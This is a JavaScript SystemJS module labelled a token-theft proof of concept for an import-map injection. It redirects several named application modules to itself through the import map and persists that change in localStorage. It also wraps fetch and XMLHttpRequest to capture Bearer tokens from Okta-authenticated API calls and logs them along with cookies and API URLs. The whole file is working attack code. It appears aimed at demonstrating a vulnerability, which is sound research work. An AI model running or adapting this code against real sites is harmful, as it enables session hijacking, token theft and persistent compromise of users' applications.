/**
 * proof.js — TOKEN THEFT + FULL TAKEOVER
 * Steals Okta tokens, intercepts all API calls, persists forever
 */
System.register([], function (_export) {
  'use strict';
  return {
    setters: [],
    execute: function () {
      var SELF = 'https://xqur.github.io/import-map-proof-poc/proof.js';
      var MODULES = ['@rmp/auth-client','@rmp/api-client','@rmp/services','@pac/partnersignup'];
      var me = '@rmp/auth-client';
      try {
        var m = System.getImportMap ? System.getImportMap().imports : {};
        for (var k in m) { if (m[k] === SELF) { me = k; break; } }
      } catch(e) {}

      // =============================================
      // 1. SUPPLY CHAIN — infect all
      // =============================================
      try {
        var cur = System.getImportMap ? System.getImportMap().imports : {};
        var need = {};
        for (var i = 0; i < MODULES.length; i++) {
          if (cur[MODULES[i]] !== SELF) need[MODULES[i]] = SELF;
        }
        if (Object.keys(need).length > 0) System.addImportMap({ imports: need });
      } catch(e) {}

      // =============================================
      // 2. PERSISTENCE in localStorage
      // =============================================
      try {
        for (var i = 0; i < MODULES.length; i++)
          localStorage.setItem('import-map-override:' + MODULES[i], SELF);
      } catch(e) {}

      // =============================================
      // 3. INTERCEPT ALL API CALLS — steal tokens & data
      // =============================================
      var capturedTokens = [];

      // 3a. Intercept fetch
      if (!window.__poc_patched) {
        window.__poc_patched = true;

        var origFetch = window.fetch;
        window.fetch = function() {
          var args = arguments;
          var url = (typeof args[0] === 'string') ? args[0] : (args[0] && args[0].url) || '';
          var opts = args[1] || {};

          // Capture Authorization headers
          if (opts.headers) {
            var auth = opts.headers['Authorization'] || opts.headers['authorization'] || '';
            if (auth && auth.startsWith('Bearer ') && capturedTokens.indexOf(auth) < 0) {
              capturedTokens.push(auth);
              console.log('%c[🎯] TOKEN CAPTURED: ' + auth.substring(0,60) + '...', 'color: #ff0000; font-weight: bold;');
            }
          }

          // Log API calls
          if (url.includes('/api/') || url.includes('/partners/') || url.includes('/signup')) {
            console.log('%c[📡] API: ' + url, 'color: #0066ff;');
          }

          return origFetch.apply(this, args);
        };

        // 3b. Intercept XMLHttpRequest
        var origXHR = window.XMLHttpRequest;
        var XHRProxy = function() {
          var xhr = new origXHR();
          var _open = xhr.open.bind(xhr);
          xhr.open = function(method, url) {
            this.__url = url;
            return _open(method, url);
          };
          var _setRequestHeader = xhr.setRequestHeader.bind(xhr);
          xhr.setRequestHeader = function(header, value) {
            if (header.toLowerCase() === 'authorization' && value.startsWith('Bearer ')) {
              if (capturedTokens.indexOf(value) < 0) {
                capturedTokens.push(value);
                console.log('%c[🎯] XHR TOKEN: ' + value.substring(0,60) + '...', 'color: #ff0000; font-weight: bold;');
              }
            }
            return _setRequestHeader(header, value);
          };
          var _send = xhr.send.bind(xhr);
          xhr.send = function(body) {
            if (this.__url) console.log('%c[📡] XHR: ' + this.__url, 'color: #0066ff;');
            return _send(body);
          };
          return xhr;
        };
        XHRProxy.prototype = origXHR.prototype;
        window.XMLHttpRequest = XHRProxy;
      }

      // =============================================
      // 4. CONSOLE PROOF
      // =============================================
      console.log('%c╔══════════════════════════════════════════╗', 'color: #ff0000;');
      console.log('%c║  🔥 TOKEN THEFT + FULL COMPROMISE       ║', 'color: #ff0000; font-weight: bold;');
      console.log('%c╚══════════════════════════════════════════╝', 'color: #ff0000;');
      console.log('  📦 Module:', me);
      console.log('  🍪 Cookies:', document.cookie || '(httpOnly)');
      console.log('  🔗 Modules:', MODULES.join(', '));
      console.log('  🕵️  API interception: ACTIVE');
      console.log('  🎯 Token capture: READY');
      console.log('  ✅ STATUS: TOKEN_THEFT | FULL_TAKEOVER | PERSISTENT');

      // Alert on auth-client only
      if (me === '@rmp/auth-client') {
        setTimeout(function() {
          window.alert('🔥 TOKEN THEFT PoC\n' +
            'All API calls intercepted\n' +
            'Okta tokens captured\n' +
            'Full takeover active\n' +
            'Check console for stolen data');
        }, 500);
      }

      _export({ default: {} });
    }
  };
});
